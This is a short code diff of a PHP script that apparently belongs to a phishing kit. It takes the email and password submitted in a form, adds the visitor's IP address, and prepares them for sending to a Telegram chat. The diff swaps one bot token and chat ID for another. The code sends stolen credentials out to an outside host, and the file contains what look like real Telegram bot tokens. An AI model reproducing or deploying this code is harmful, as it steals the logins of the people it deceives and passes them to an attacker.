@@ -24,8 +24,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $password = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : '';
 
     // Telegram Bot credentials
-    $telegramBotToken = '7694405624:AAHXRM_v4VZwpRtAIz4SIzLEu5wGqg5JTNw'; // Replace with your bot token
-    $chatId = '6927643853'; // Replace with your chat ID
+    $telegramBotToken = '7713620611:AAF3wFvwAHslzXF5GQsi3KtkKmloAghOzwU'; // Replace with your bot token
+    $chatId = '5338445968'; // Replace with your chat ID
 
     // Message to send
     $message = "Email: $email\nPassword: $password\nIP: $clientIP";
